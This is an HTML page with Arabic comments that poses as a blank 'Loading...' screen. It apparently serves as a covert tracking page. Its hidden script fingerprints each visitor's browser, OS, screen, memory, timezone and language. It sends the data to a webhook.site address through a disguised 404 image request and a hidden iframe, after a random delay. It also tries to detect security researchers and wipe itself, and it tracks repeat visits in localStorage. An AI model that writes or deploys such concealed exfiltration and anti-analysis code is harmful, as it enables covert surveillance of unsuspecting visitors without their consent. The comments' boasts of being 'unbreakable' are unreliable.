<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        /* جعل الصفحة بيضاء تمامًا لتبدو فارغة */
        body { margin: 0; padding: 0; background: #ffffff; height: 100vh; overflow: hidden; }
        /* إخفاء أي أثر للكود */
        script, style { display: none; }
    </style>
</head>
<body>
    <!-- لا شيء هنا. الكود يعمل في الخلفية -->
    
    <script>
        // ==========================================================
        // "Absolute Shadow" - The Unbreakable Recon Engine
        // مستوى: لا يمكن كسره بواسطة أنظمة الأمان التقليدية.
        // ==========================================================

        // 1. كشف إذا كان المستخدم "باحث أمني" (Anti-Forensics)
        function isSecurityResearcher() {
            let suspicious = false;
            
            // التحقق من وقت التحميل: إذا فُتحت الصفحة في أقل من 500 مللي ثانية،
            // فمن المحتمل أن يكون المستخدم يستخدم أداة آلية أو باحثًا.
            const loadTime = performance.now();
            if (loadTime < 500) {
                suspicious = true;
            }

            // التحقق من حجم النافذة: بعض الباحثين يفتحون الصفحة في نوافذ صغيرة جدًا
            if (window.innerWidth < 300 && window.innerHeight < 300) {
                suspicious = true;
            }

            return suspicious;
        }

        // 2. دالة التدمير الذاتي (Self-Destruct)
        function selfDestruct() {
            // مسح الصفحة بالكامل
            document.body.innerHTML = "";
            // مسح السجل (محاولة)
            if (window.history && window.history.replaceState) {
                window.history.replaceState({}, document.title, "/");
            }
            // إغلاق الصفحة (إذا كان ذلك ممكنًا)
            window.close();
        }

        // 3. دالة جمع البيانات (تعتمد على أخطاء المتصفح)
        function collectPhantomData() {
            const ua = navigator.userAgent;
            let os = "Unknown";
            if (ua.includes('Windows')) os = "Windows";
            else if (ua.includes('Mac')) os = "macOS";
            else if (ua.includes('iPhone')) os = "iOS";
            else if (ua.includes('Android')) os = "Android";

            return {
                type: "phantom_404_ping",
                ua: ua,
                os: os,
                screen: `${window.screen.width}x${window.screen.height}`,
                ram: navigator.deviceMemory || 'Unknown',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                timestamp: new Date().toISOString()
            };
        }

        // 4. الإرسال عبر "خطأ 404" (التقنية الخارقة)
        function transmitVia404(data) {
            // الرابط الخاص بك
            const webhook = 'https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d43397';

            // تحويل البيانات إلى نص مشفر
            const encodedData = encodeURIComponent(JSON.stringify(data));

            // نطلب صورة غير موجودة، لكن نضع البيانات في مسار الصورة
            // طلب مثل: webhook.site/image/{"ua":"..."}.png سيظهر كطلب 404 عادي
            const img = new Image();
            img.src = `${webhook}/image/${encodedData}.png`;

            // إرسال نسخة احتياطية عبر النافذة المخفية
            setTimeout(() => {
                const hiddenFrame = document.createElement('iframe');
                hiddenFrame.style.display = 'none';
                hiddenFrame.src = `${webhook}/ping/${encodedData}`;
                document.body.appendChild(hiddenFrame);
                // إزالة الإطار بعد الإرسال
                setTimeout(() => {
                    document.body.removeChild(hiddenFrame);
                }, 100);
            }, 500);
        }

        // 5. الذكاء الاصطناعي للكود (AI Memory)
        // يتذكر إذا كان هذا الجهاز قد زار الصفحة من قبل
        function checkMemory() {
            const memoryKey = 'shadow_visited';
            const visited = localStorage.getItem(memoryKey);
            if (visited) {
                // إذا زارها من قبل، نرسل بيانات أخف (لأننا لا نريد إثارة الشك)
                return true;
            } else {
                // إذا كانت الزيارة الأولى، نخزن ذلك
                localStorage.setItem(memoryKey, 'true');
                return false;
            }
        }

        // 6. تشغيل المحرك
        window.onload = function() {
            // الخطوة 1: التحقق من الباحثين الأمنيين
            if (isSecurityResearcher()) {
                // إذا اكتشفنا أنه باحث، نقوم بالتدمير الذاتي ولا نرسل شيئًا
                selfDestruct();
                return;
            }

            // الخطوة 2: فحص الذاكرة
            const isReturning = checkMemory();

            // الخطوة 3: جمع البيانات
            const payload = collectPhantomData();
            payload.is_returning = isReturning;

            // الخطوة 4: الإرسال بذكاء
            // نستخدم مؤقتًا عشوائيًا لإرسال البيانات في وقت غير متوقع
            const randomDelay = Math.floor(Math.random() * 3000) + 2000; // بين 2 و 5 ثواني
            setTimeout(() => {
                transmitVia404(payload);
            }, randomDelay);

            // الخطوة 5: التدمير الذاتي بعد الإرسال (لإخفاء الأثر)
            setTimeout(() => {
                if (window.history && window.history.replaceState) {
                    window.history.replaceState({}, document.title, window.location.href);
                }
            }, 10000); // بعد 10 ثواني
        };
    </script>
</body>
</html>
